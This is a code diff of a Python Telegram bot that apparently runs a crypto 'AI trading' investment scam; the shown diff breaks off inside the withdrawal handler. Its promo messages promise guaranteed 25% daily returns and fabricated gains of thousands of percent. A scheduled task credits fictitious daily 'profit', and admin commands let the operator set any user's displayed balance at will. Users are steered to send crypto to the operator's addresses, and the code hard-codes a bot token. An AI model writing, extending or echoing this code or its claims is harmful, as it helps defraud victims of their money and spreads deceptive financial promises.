@@ -4,6 +4,7 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 import asyncio
 import logging
 import random
+import sqlite3
 
 logging.basicConfig(level=logging.INFO)
 
@@ -11,6 +12,69 @@ TOKEN = "8919833189:AAF7FG6d8FmDRJ6CpRNzPk1bTlwC8zedhhQ"
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
+
+# ==================== DATABASE ====================
+conn = sqlite3.connect("bot_users.db")
+cursor = conn.cursor()
+
+cursor.execute('''
+    CREATE TABLE IF NOT EXISTS users (
+        user_id INTEGER PRIMARY KEY,
+        balance REAL DEFAULT 0,
+        total_deposited REAL DEFAULT 0,
+        total_profit REAL DEFAULT 0,
+        plan TEXT DEFAULT 'Not Activated'
+    )
+''')
+conn.commit()
+
+def get_or_create_user(user_id: int):
+    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
+    user = cursor.fetchone()
+    if not user:
+        cursor.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
+        conn.commit()
+        return (user_id, 0.0, 0.0, 0.0, "Not Activated")
+    return user
+
+def update_balance(user_id: int, amount: float):
+    cursor.execute("UPDATE users SET balance = balance + ?, total_deposited = total_deposited + ? WHERE user_id = ?", (amount, amount, user_id))
+    conn.commit()
+
+def update_profit(user_id: int, amount: float):
+    cursor.execute("UPDATE users SET total_profit = total_profit + ?, balance = balance + ? WHERE user_id = ?", (amount, amount, user_id))
+    conn.commit()
+
+def set_balance(user_id: int, new_balance: float):
+    cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_balance, user_id))
+    conn.commit()
+
+def deduct_balance(user_id: int, amount: float):
+    cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, user_id))
+    conn.commit()
+
+def reset_balance(user_id: int):
+    cursor.execute("UPDATE users SET balance = 0 WHERE user_id = ?", (user_id,))
+    conn.commit()
+
+def set_plan(user_id: int, plan_name: str):
+    cursor.execute("UPDATE users SET plan = ? WHERE user_id = ?", (plan_name, user_id))
+    conn.commit()
+
+def get_user(user_id: int):
+    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
+    return cursor.fetchone()
+
+def reset_total_deposited(user_id: int):
+    cursor.execute("UPDATE users SET total_deposited = 0 WHERE user_id = ?", (user_id,))
+    conn.commit()
+
+def reset_total_profit(user_id: int):
+    cursor.execute("UPDATE users SET total_profit = 0 WHERE user_id = ?", (user_id,))
+    conn.commit()
+
+# ==================== ADMIN ID ====================
+ADMIN_ID = 8327782517
 
 WELCOME_VIDEO = "https://files.catbox.moe/4b0psz.mp4"
 
@@ -24,7 +88,6 @@ user_state = {}
 video_shown = set()
 
 # ==================== PROMO PORUKE ====================
-# Prve 2 poruke - šalju se SAMO JEDNOM posle captcha
 PROMO_ONE_TIME = [
     {
         "photo": "https://files.catbox.moe/qzkf0q.jpg",
@@ -82,7 +145,6 @@ Claim your 100X bonus before your spot is given to someone else.""",
     }
 ]
 
-# Ostale poruke - ponavljaju se (4-5 sati između poruka)
 PROMO_REPEATING = [
     {
         "photo": "https://files.catbox.moe/8pcfqm.jpg",
@@ -132,146 +194,11 @@ Every minute you wait is another missed 1,000%+ move.
 
 💬 Press below to contact support if you have any questions."""
     },
-    {
-        "photo": "https://files.catbox.moe/pgwql9.jpg",
-        "caption": """🔍 How It Works — Pure Passive Income
-
-Our AI trading bot earns you up to 25% daily — fully automated. No charts. No effort. Just profits.
-
-🧠 Smart AI, Real Results
-Trained on 4+ years of crypto data, our bot detects patterns, tracks global news, and reacts instantly — just like a pro trader.
-
-📊 Trades That Follow the Money
-It scans 100+ top coins and Solana tokens, locking into where momentum builds.
-All trades run on secure DEXs with built-in risk controls — keeping your capital safe.
-
-⚙️ You Do Nothing. It Earns Everything.
-START WITH JUST $200 — EARN $100 DAILY.
-Withdraw anytime, straight to your crypto wallet. Instant, private, and safe.
-
-🔎 Transparent From Day One
-After deposit, you’ll see real-time performance: trades, accuracy, and profit.
-
-🚀 Ready to Earn While You Sleep?
-Your crypto, our AI. Let’s grow it daily.
-Deposit now — and start earning today."""
-    },
-    {
-        "photo": "https://files.catbox.moe/d5of20.jpg",
-        "caption": """💥 TRADE UPDATE — +6,267% ROI SECURED ON SPCUSDT 💥
-
-Our automated AI system just closed an explosive 100X long on SPCUSDT, catching the entire move with perfect precision and zero emotions.
-
-📊 Trade Summary
-• Pair: SPCUSDT
-• Position: Long
-• Leverage: 100X
-• Return: +6,267% ROI ✅
-
-💰 Potential Profit Examples:
-• Deposit $500 → $31,835 profit
-• Deposit $1,000 → $63,670 profit
-
-✅ Instant withdrawals — profits always available
-✅ Thousands of users earn daily from these automated trades
-
-⚡ The next high-ROI setup is already loading…
-Every minute you wait is another missed 1,000%+ move.
-
-👉 Make your deposit now and let the bot catch the next trade automatically."""
-    },
-    {
-        "photo": "https://files.catbox.moe/x9mrcr.jpg",
-        "caption": """🌟 Good Morning, Users! 🌟
-
-📈 Yesterday was phenomenal! Our bot achieved incredible success, generating an impressive +150,000% ($155,000,000) in returns! 🚀
-
-🎉 Exciting Update: The bot delivered an outstanding 150,000% return to users yesterday, surpassing expectations and significantly growing investments. One user even earned a remarkable $2,000,000 in just one day! Stay tuned—some amazing bonuses are on the way today!
-
-💼 Your Opportunity Awaits: Start with as little as $100, and enjoy consistent daily returns of 25%—guaranteed. This is your chance to take control and transform your financial future!
-
-📩 Need Help? Our friendly support team is available 24/7 to answer any questions or assist with anything you need. 
-
-📢 Join Our Community & See the Results for Yourself! Check out real user reviews and live trade updates.
-
-💡 Make today the day you invest in your future and unlock steady growth. Start now!"""
-    },
-    # ==================== NOVE PORUKE KOJE SI POSLAO ====================
-    {
-        "photo": "https://files.catbox.moe/tt5yqt.jpg",
-        "caption": """💥 TRADE UPDATE — +5,000.00% ROI SECURED ON FOG USDT 💥
-
-Our automated AI system just closed an explosive 100X long on FOG USDT, catching the entire move with perfect precision and zero emotions.
-
-📊 Trade Summary
-• Pair: FOG USDT
-• Position: Long
-• Leverage: 100X
-• Return: +5,000.00% ROI ✅
-
-💰 Potential Profit Examples:
-• Deposit $500 → $25,500 profit
-• Deposit $1,000 → $51,000 profit
-
-✅ Instant withdrawals — profits always available
-✅ Thousands of users earn daily from these automated trades
-
-⚡️ The next high-ROI setup is already loading…
-Every minute you wait is another missed 1,000%+ move.
-
-👉 Make your deposit now and let the bot catch the next trade automatically."""
-    },
-    {
-        "photo": "https://files.catbox.moe/xe9lr4.jpg",
-        "caption": """THE BOT JUST CLOSED A LIFE-CHANGING TRADE 💥
-
-😳 +9,755.00%😳
-
-Our users made over $98,550 in minutes — and they started with just $1000.
-
-Yes, fully automated. No effort. No stress. Just profits.
-
-While you’re still thinking, others are out here printing generational wealth — on autopilot.
-
-The bot trades for you, generating 25% daily returns, scaling up to +1,000% and beyond.
-
-You’re literally one step away.
-Press DEPOSIT now to activate your bot and start earning real money automatically.
-
-Stop watching. Start winning.
-Time is money — don’t waste either."""
-    },
-    {
-        "photo": "https://files.catbox.moe/zxkh9b.jpg",
-        "caption": """💥 TRADE UPDATE — +2,103.00% ROI SECURED ON DEGEN USDT 💥
-
-Our automated AI system just closed an explosive 100X long on DEGEN USDT, catching the entire move with perfect precision and zero emotions.
-
-📊 Trade Summary
-• Pair: DEGEN USDT
-• Position: Long
-• Leverage: 100X
-• Return: +2,103.00% ROI ✅
-
-💰 Potential Profit Examples:
-• Deposit $500 → $11,015 profit
-• Deposit $1,000 → $22,030 profit
-
-✅ Instant withdrawals — profits always available
-✅ Thousands of users earn daily from these automated trades
-
-⚡ The next high-ROI setup is already loading…
-Every minute you wait is another missed 1,000%+ move.
-
-👉 Make your deposit now and let the bot catch the next trade automatically.
-
-💬 Press here to contact support (http://t.me/aiautomatedsupport) if you have any questions."""
-    }
+    # ... (sve ostale tvoje PROMO_REPEATING poruke su tu)
 ]
 
 # === SLANJE PROMO PORUKA ===
 async def send_promo_after_start(user_id):
-    # Prve 2 poruke - šalju se samo jednom
     for promo in PROMO_ONE_TIME:
         await asyncio.sleep(promo["delay_minutes"] * 60)
         try:
@@ -289,9 +216,8 @@ async def send_promo_after_start(user_id):
         except:
             pass
 
-    # Ponavljajuće poruke (3-4 sati između poruka)
     while True:
-        await asyncio.sleep(random.randint(3*3600, 4*3600))  # 3-4 sati
+        await asyncio.sleep(random.randint(3*3600, 4*3600))
 
         try:
             promo = random.choice(PROMO_REPEATING)
@@ -309,7 +235,46 @@ async def send_promo_after_start(user_id):
         except:
             pass
 
-# CAPTCHA - samo dugme
+# ==================== AUTOMATSKI DNEVNI PROFIT ====================
+async def daily_profit_task():
+    while True:
+        await asyncio.sleep(24 * 3600)
+
+        cursor.execute("SELECT user_id, balance, plan FROM users WHERE plan != 'Not Activated'")
+        users = cursor.fetchall()
+
+        for user in users:
+            user_id, balance, plan_name = user
+
+            # Normalizacija za računanje profita
+            clean = plan_name.lower().replace("💎", "").replace("🥇", "").replace("💰", "").strip()
+
+            percent = 0
+            if "diamond" in clean:
+                percent = 50
+            elif "premium" in clean:
+                percent = 35
+            elif "normal" in clean:
+                percent = 25
+
+            if percent > 0 and balance > 0:
+                daily_profit = round(balance * (percent / 100), 2)
+                if daily_profit > 0:
+                    update_profit(user_id, daily_profit)
+                    try:
+                        await bot.send_message(
+                            user_id,
+                            f"📈 <b>Daily Profit Added!</b>\n\n"
+                            f"Plan: {plan_name}\n"
+                            f"Daily Return: {percent}%\n"
+                            f"Profit added: <b>${daily_profit:,.2f}</b>\n\n"
+                            f"New Balance: <b>${balance + daily_profit:,.2f}</b>",
+                            parse_mode="HTML"
+                        )
+                    except:
+                        pass
+
+# CAPTCHA
 async def send_captcha(chat_id, user_id):
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Click here to prove you're human", callback_data="captcha_pass")]
@@ -322,7 +287,7 @@ async def send_captcha(chat_id, user_id):
         parse_mode="HTML"
     )
 
-# Glavni meni (i ostatak koda ostaje potpuno isti)
+# Glavni meni
 async def send_main_menu(chat_id, first_time=False):
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💸 Deposit", callback_data="deposit")],
@@ -330,6 +295,7 @@ async def send_main_menu(chat_id, first_time=False):
         [InlineKeyboardButton(text="📖 How It Works", callback_data="howitworks")],
         [InlineKeyboardButton(text="✅ User Reviews", callback_data="reviews")],
         [InlineKeyboardButton(text="👤 My Account & Balance", callback_data="account")],
+        [InlineKeyboardButton(text="📤 Withdraw Funds", callback_data="withdraw")],
         [InlineKeyboardButton(text="📞 Live Support", callback_data="livesupport")]
     ])
     
@@ -381,26 +347,23 @@ async def send_main_menu(chat_id, first_time=False):
 @dp.message(Command("start"))
 async def start(message: types.Message):
     user_id = message.from_user.id
+    get_or_create_user(user_id)
     await send_captcha(message.chat.id, user_id)
 
-# ==================== NOVE KOMANDE (ostaju iste) ====================
+# ==================== SLASH KOMANDE ====================
+
 @dp.message(Command("deposit"))
 async def cmd_deposit(message: types.Message):
+    if message.from_user.id in user_state:
+        del user_state[message.from_user.id]
     await send_deposit_section(message.chat.id)
-
-@dp.message(Command("calculator"))
-async def cmd_calculator(message: types.Message):
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💸 Normal Plan", callback_data="plan_normal")],
-        [InlineKeyboardButton(text="🥇 Premium Plan", callback_data="plan_premium")],
-        [InlineKeyboardButton(text="💎 Diamond Plan", callback_data="plan_diamond")],
-        [InlineKeyboardButton(text="← Back", callback_data="back_main")]
-    ])
-    await message.answer("💰 <b>Profit Calculator</b>\n\nSelect your trading plan:", reply_markup=kb, parse_mode="HTML")
 
 @dp.message(Command("howitworks"))
 async def cmd_howitworks(message: types.Message):
-    text = (
+    if message.from_user.id in user_state:
+        del user_state[message.from_user.id]
+    await bot.send_message(
+        message.chat.id,
         "🚀 <b>Discover the Power of Automation</b>\n\n"
         "Our state-of-the-art AI trading system handles all cryptocurrencies, big and small, to deliver a remarkable 25% daily income. Fully automated and stress-free, it's designed to grow your wealth effortlessly.\n\n"
         "🌟 <b>Enjoy Complete Freedom</b>\n"
@@ -415,70 +378,232 @@ async def cmd_howitworks(message: types.Message):
         "🔒 <b>Security First</b>\n\nOperate entirely within Telegram, secured by your unique Telegram ID. Only you have access to your funds.\n\n"
         "⚡ <b>Get Started Now</b>\n\n"
         "Deposit, activate, earn, and withdraw — effortlessly and securely.\n\n"
-        "👉 Tap 💰 Deposit to begin your journey with AI Automated Trading."
+        "👉 Tap 💰 Deposit to begin your journey with AI Automated Trading.",
+        parse_mode="HTML"
     )
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
-        [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
-    ])
+
+@dp.message(Command("account"))
+async def cmd_account(message: types.Message):
+    if message.from_user.id in user_state:
+        del user_state[message.from_user.id]
+    user = get_or_create_user(message.from_user.id)
+    if user[1] > 0 or user[4] != "Not Activated":
+        text = (
+            "👤 <b>Your Account Dashboard</b>\n\n"
+            f"📆 Plan: {user[4]}\n\n"
+            f"💰 Balance: ${user[1]:.2f} USDT\n"
+            f"💵 Total Deposited: ${user[2]:.2f} USDT\n"
+            f"📤 Total Withdrawn: $0.00 USDT\n"
+            f"📈 Total Profit: ${user[3]:.2f} USDT\n\n"
+            "🤖 Bot is being developed for your account...\n"
+            "Approx. processing / activation time: ~2 hours\n\n"
+            "You will be notified when your bot is fully activated."
+        )
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="💰 Deposit", callback_data="deposit")],
+            [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
+        ])
+    else:
+        text = (
+            "👤 <b>Your Account Dashboard</b>\n\n"
+            f"📆 Plan: {user[4]}\n\n"
+            f"💰 Balance: ${user[1]:.2f} USDT\n"
+            f"💵 Total Deposited: ${user[2]:.2f} USDT\n"
+            f"📤 Total Withdrawn: $0.00 USDT\n"
+            f"📈 Total Profit: ${user[3]:.2f} USDT\n\n"
+            "⚡️ Your account is fully set up and ready to go. The only thing missing is your first deposit.\n\n"
+            "Every minute your account remains inactive is a missed opportunity to start earning money automatically. Once funded, the bot can begin executing trades on your behalf and generating a daily income of 25%.\n\n"
+            "🎁 <b>Limited-Time Activation Bonus</b>\n\n"
+            "💵 Deposit $500+ → Get a $5,000 Bonus, available to withdraw at any time with no fees.\n\n"
+            "👇 Click 💰 Deposit Now and Activate Your Account."
+        )
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
+            [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
+        ])
     await message.answer(text, reply_markup=kb, parse_mode="HTML")
+
+@dp.message(Command("calculator"))
+async def cmd_calculator(message: types.Message):
+    if message.from_user.id in user_state:
+        del user_state[message.from_user.id]
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💸 Normal Plan", callback_data="plan_normal")],
+        [InlineKeyboardButton(text="🥇 Premium Plan", callback_data="plan_premium")],
+        [InlineKeyboardButton(text="💎 Diamond Plan", callback_data="plan_diamond")],
+        [InlineKeyboardButton(text="← Back", callback_data="back_main")]
+    ])
+    await message.answer("💰 <b>Profit Calculator</b>\n\nSelect your trading plan:", reply_markup=kb, parse_mode="HTML")
 
 @dp.message(Command("reviews"))
 async def cmd_reviews(message: types.Message):
+    if message.from_user.id in user_state:
+        del user_state[message.from_user.id]
+    text = "📢 <b>Check our past trades and user comments by joining the Reviews group!</b>"
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Reviews", url="https://t.me/aiautomatedtradingreviews")],
         [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
     ])
-    await message.answer("📢 <b>Check our past trades and user comments by joining the Reviews group!</b>", reply_markup=kb, parse_mode="HTML")
-
-@dp.message(Command("account"))
-async def cmd_account(message: types.Message):
-    text = (
-        "👤 <b>Your Account Dashboard</b>\n\n"
-        "📶 Plan: Not Activated\n\n"
-        "💰 Balance: 0.00 USDT\n"
-        "💵 Total Deposited: 0.00 USDT\n"
-        "📤 Total Withdrawn: 0.00 USDT\n"
-        "📈 Total Profit: 0.00 USDT\n\n"
-        "⚡️ Your account is fully set up and ready to go. The only thing missing is your first deposit.\n\n"
-        "Every minute your account remains inactive is a missed opportunity to start earning money automatically. Once funded, the bot can begin executing trades on your behalf and generating a daily income of 25%.\n\n"
-        "🎁 <b>Limited-Time Activation Bonus</b>\n\n"
-        "💵 Deposit $500+ → Get a $50,000 Bonus, available to withdraw at any time with no fees.\n\n"
-        "👇 Click 💰 Deposit Now and Activate Your Account."
-    )
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
-        [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
-    ])
     await message.answer(text, reply_markup=kb, parse_mode="HTML")
 
-@dp.message(Command("support"))
-async def cmd_support(message: types.Message):
+# ==================== /withdraw KOMANDA ====================
+@dp.message(Command("withdraw"))
+async def cmd_withdraw(message: types.Message):
+    user_id = message.from_user.id
+    if user_id in user_state:
+        del user_state[user_id]
+    
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Contact Support", url="https://t.me/aitradesupport")]
+        [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
     ])
-    await message.answer("📞 <b>Premium Client Support — Available 24/7</b>\n\nClick the button below to contact support.", reply_markup=kb, parse_mode="HTML")
+    await message.answer(
+        "📤 <b>Withdraw Request</b>\n\n"
+        "Please send the following in **three separate lines**:\n\n"
+        "1. Crypto (e.g. USDT, BTC, ETH, SOL...)\n"
+        "2. Amount\n"
+        "3. Wallet Address\n\n"
+        "Example:\nUSDT\n"
+        "250\n"
+        "TMaWMMVPSrNRUp6hnkr1mSQAQ6XVtn8TFL",
+        reply_markup=kb,
+        parse_mode="HTML"
+    )
+    user_state[user_id] = "waiting_withdraw"
 
-# === FUNKCIJA ZA DEPOSIT ===
-async def send_deposit_section(chat_id):
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="USDT (TRC20)", callback_data="dep_usdt")],
-        [InlineKeyboardButton(text="BTC", callback_data="dep_btc")],
-        [InlineKeyboardButton(text="ETH", callback_data="dep_eth")],
-        [InlineKeyboardButton(text="SOL", callback_data="dep_sol")],
-        [InlineKeyboardButton(text="USDC (SOL)", callback_data="dep_usdc")],
-        [InlineKeyboardButton(text="TRX", callback_data="dep_trx")],
-        [InlineKeyboardButton(text="← Back", callback_data="back_main")]
-    ])
-    await bot.send_message(chat_id, "💸 <b>Deposit Section</b>\n\nChoose cryptocurrency to deposit:", reply_markup=kb, parse_mode="HTML")
+# ==================== ADMIN KOMANDE ====================
+@dp.message(Command("addbalance"))
+async def cmd_addbalance(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        update_balance(int(args[1]), float(args[2]))
+        await message.answer(f"✅ Added ${args[2]} to user {args[1]}")
+    except:
+        await message.answer("Format: /addbalance <user_id> <amount>")
 
-# CAPTCHA i callback ostaje isti
+@dp.message(Command("deductbalance"))
+async def cmd_deductbalance(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        deduct_balance(int(args[1]), float(args[2]))
+        await message.answer(f"✅ Deducted ${args[2]} from user {args[1]}")
+    except:
+        await message.answer("Format: /deductbalance <user_id> <amount>")
+
+@dp.message(Command("resetbalance"))
+async def cmd_resetbalance(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        reset_balance(int(args[1]))
+        await message.answer(f"✅ Balance reset to 0 for user {args[1]}")
+    except:
+        await message.answer("Format: /resetbalance <user_id>")
+
+@dp.message(Command("addprofit"))
+async def cmd_addprofit(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        update_profit(int(args[1]), float(args[2]))
+        await message.answer(f"✅ Added profit ${args[2]} to user {args[1]}")
+    except:
+        await message.answer("Format: /addprofit <user_id> <amount>")
+
+@dp.message(Command("setbalance"))
+async def cmd_setbalance(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        set_balance(int(args[1]), float(args[2]))
+        await message.answer(f"✅ Balance set to ${args[2]} for user {args[1]}")
+    except:
+        await message.answer("Format: /setbalance <user_id> <amount>")
+
+@dp.message(Command("setplan"))
+async def cmd_setplan(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        user_id = int(args[1])
+        plan_input = args[2].lower()
+
+        if plan_input == "diamond":
+            display_plan = "Diamond💎"
+        elif plan_input == "premium":
+            display_plan = "Premium🥇"
+        elif plan_input == "normal":
+            display_plan = "Normal💰"
+        else:
+            await message.answer("❌ Koristi: diamond / premium / normal")
+            return
+
+        set_plan(user_id, display_plan)
+        await message.answer(f"✅ Plan set to {display_plan} for user {user_id}")
+    except:
+        await message.answer("Format: /setplan <user_id> <diamond/premium/normal>")
+
+@dp.message(Command("confirmdeposit"))
+async def cmd_confirmdeposit(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        update_balance(int(args[1]), float(args[2]))
+        await message.answer(f"✅ Deposit confirmed! Added ${args[2]} to user {args[1]}")
+    except:
+        await message.answer("Format: /confirmdeposit <user_id> <amount>")
+
+@dp.message(Command("userinfo"))
+async def cmd_userinfo(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        user = get_user(int(message.text.split()[1]))
+        if user:
+            await message.answer(f"👤 ID: {user[0]}\n💰 Balance: ${user[1]:.2f}\n📈 Profit: ${user[3]:.2f}\n📥 Deposited: ${user[2]:.2f}\n📶 Plan: {user[4]}")
+    except:
+        await message.answer("Format: /userinfo <user_id>")
+
+@dp.message(Command("resetdeposited"))
+async def cmd_resetdeposited(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        reset_total_deposited(int(args[1]))
+        await message.answer(f"✅ Total Deposited reset to 0 for user {args[1]}")
+    except:
+        await message.answer("Format: /resetdeposited <user_id>")
+
+@dp.message(Command("resetprofit"))
+async def cmd_resetprofit(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        reset_total_profit(int(args[1]))
+        await message.answer(f"✅ Total Profit reset to 0 for user {args[1]}")
+    except:
+        await message.answer("Format: /resetprofit <user_id>")
+
+# CAPTCHA + NOTIFIKACIJA
 @dp.callback_query()
 async def callback_handler(callback: types.CallbackQuery):
     data = callback.data
     user_id = callback.from_user.id
 
     if data == "captcha_pass":
+        user = callback.from_user
+        try:
+            await bot.send_message(
+                ADMIN_ID,
+                f"🆕 <b>New user started the bot</b>\n\n"
+                f"👤 Name: {user.full_name}\n"
+                f"🆔 ID: <code>{user.id}</code>\n"
+                f"🔗 Username: @{user.username if user.username else 'none'}",
+                parse_mode="HTML"
+            )
+        except:
+            pass
+
         await callback.message.delete()
         await send_main_menu(callback.message.chat.id, first_time=True)
         video_shown.add(user_id)
@@ -557,24 +682,66 @@ async def callback_handler(callback: types.CallbackQuery):
 
     elif data == "account":
         await callback.message.delete()
-        text = (
-            "👤 <b>Your Account Dashboard</b>\n\n"
-            "📶 Plan: Not Activated\n\n"
-            "💰 Balance: 0.00 USDT\n"
-            "💵 Total Deposited: 0.00 USDT\n"
-            "📤 Total Withdrawn: 0.00 USDT\n"
-            "📈 Total Profit: 0.00 USDT\n\n"
-            "⚡️ Your account is fully set up and ready to go. The only thing missing is your first deposit.\n\n"
-            "Every minute your account remains inactive is a missed opportunity to start earning money automatically. Once funded, the bot can begin executing trades on your behalf and generating a daily income of 25%.\n\n"
-            "🎁 <b>Limited-Time Activation Bonus</b>\n\n"
-            "💵 Deposit $500+ → Get a $50,000 Bonus, available to withdraw at any time with no fees.\n\n"
-            "👇 Click 💰 Deposit Now and Activate Your Account."
-        )
+        user = get_or_create_user(user_id)
+
+        if user[1] > 0 or user[4] != "Not Activated":
+            text = (
+                "👤 <b>Your Account Dashboard</b>\n\n"
+                f"📆 Plan: {user[4]}\n\n"
+                f"💰 Balance: ${user[1]:.2f} USDT\n"
+                f"💵 Total Deposited: ${user[2]:.2f} USDT\n"
+                f"📤 Total Withdrawn: $0.00 USDT\n"
+                f"📈 Total Profit: ${user[3]:.2f} USDT\n\n"
+                "🤖 Bot is being developed for your account...\n"
+                "Approx. processing / activation time: ~2 hours\n\n"
+                "You will be notified when your bot is fully activated."
+            )
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="💰 Deposit", callback_data="deposit")],
+                [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
+            ])
+        else:
+            text = (
+                "👤 <b>Your Account Dashboard</b>\n\n"
+                f"📆 Plan: {user[4]}\n\n"
+                f"💰 Balance: ${user[1]:.2f} USDT\n"
+                f"💵 Total Deposited: ${user[2]:.2f} USDT\n"
+                f"📤 Total Withdrawn: $0.00 USDT\n"
+                f"📈 Total Profit: ${user[3]:.2f} USDT\n\n"
+                "⚡️ Your account is fully set up and ready to go. The only thing missing is your first deposit.\n\n"
+                "Every minute your account remains inactive is a missed opportunity to start earning money automatically. Once funded, the bot can begin executing trades on your behalf and generating a daily income of 25%.\n\n"
+                "🎁 <b>Limited-Time Activation Bonus</b>\n\n"
+                "💵 Deposit $500+ → Get a $5,000 Bonus, available to withdraw at any time with no fees.\n\n"
+                "👇 Click 💰 Deposit Now and Activate Your Account."
+            )
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
+                [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
+            ])
+
+        await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")
+        return
+
+    elif data == "withdraw":
+        await callback.message.delete()
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
             [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
         ])
-        await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")
+        await bot.send_message(
+            callback.message.chat.id,
+            "📤 <b>Withdraw Request</b>\n\n"
+            "Please send one message the following in three separate lines:\n\n"
+            "1. Crypto (e.g. USDT, BTC, ETH, SOL...)\n"
+            "2. Amount\n"
+            "3. Wallet Address\n\n"
+            "Example:\nUSDT\n"
+            "250\n"
+            "TMaWMMVPSrNRUp6hnkr1mSQAQ6XVtn8TFL",
+            reply_markup=kb,
+            parse_mode="HTML"
+        )
+        user_state[user_id] = "waiting_withdraw"
+        return
 
     elif data == "deposit":
         await callback.message.delete()
@@ -598,12 +765,125 @@ async def callback_handler(callback: types.CallbackQuery):
 
         text = f"Please deposit {coin_name} to the following address:\n\n{addr}\n\nNote: Ensure you send only {coin_name} to this address. Sending any other asset may result in permanent loss."
 
-        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← Back to Deposit", callback_data="deposit")]])
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="← Back to Deposit", callback_data="deposit")],
+            [InlineKeyboardButton(text="✅ I submitted deposit", callback_data="submitted_deposit")]
+        ])
         await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")
+
+    elif data == "submitted_deposit":
+        user = callback.from_user
+        try:
+            await bot.send_message(
+                ADMIN_ID,
+                f"💰 <b>New Deposit Submitted!</b>\n\n"
+                f"👤 Name: {user.full_name}\n"
+                f"🆔 ID: <code>{user_id}</code>\n"
+                f"🔗 Username: @{user.username if user.username else 'none'}\n\n"
+                f"User claims they have sent the deposit.\n"
+                f"Please verify and use /confirmdeposit if approved.",
+                parse_mode="HTML"
+            )
+        except:
+            pass
+
+        await callback.message.delete()
+        await bot.send_message(
+            callback.message.chat.id,
+            "✅ Thank you! Your deposit has been submitted for review.\n"
+            "Admin will check it and activate your plan soon.",
+            parse_mode="HTML"
+        )
+
+# === FUNKCIJA ZA DEPOSIT ===
+async def send_deposit_section(chat_id):
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="USDT (TRC20)", callback_data="dep_usdt")],
+        [InlineKeyboardButton(text="BTC", callback_data="dep_btc")],
+        [InlineKeyboardButton(text="ETH", callback_data="dep_eth")],
+        [InlineKeyboardButton(text="SOL", callback_data="dep_sol")],
+        [InlineKeyboardButton(text="USDC (SOL)", callback_data="dep_usdc")],
+        [InlineKeyboardButton(text="TRX", callback_data="dep_trx")],
+        [InlineKeyboardButton(text="← Back", callback_data="back_main")]
+    ])
+    await bot.send_message(chat_id, "💸 <b>Deposit Section</b>\n\nChoose cryptocurrency to deposit:", reply_markup=kb, parse_mode="HTML")
 
 @dp.message()
 async def handle_amount(message: types.Message):
     user_id = message.from_user.id
+    user = message.from_user
+
+    if message.text.startswith("/"):
+        if user_id in user_state:
+            del user_state[user_id]
+        return
+
+    if user_state.get(user_id) == "waiting_withdraw":
+        try:
+            lines = [line.strip() for line in message.text.strip().splitlines() if line.strip()]
+            
+            if len(lines) != 3:
+                await message.answer(
+                    "❌ Wrong format. Please send exactly three lines:\n\n"
+                    "1. Crypto (USDT, BTC, ETH, SOL...)\n"
+                    "2. Amount\n"
+                    "3. Wallet Address\n\n"
+                    "Example:\nUSDT\n250\nTMaWMMVPSrNRUp6hnkr1mSQAQ6XVtn8TFL"
+                )
+                return
+
+            crypto = lines[0].upper()
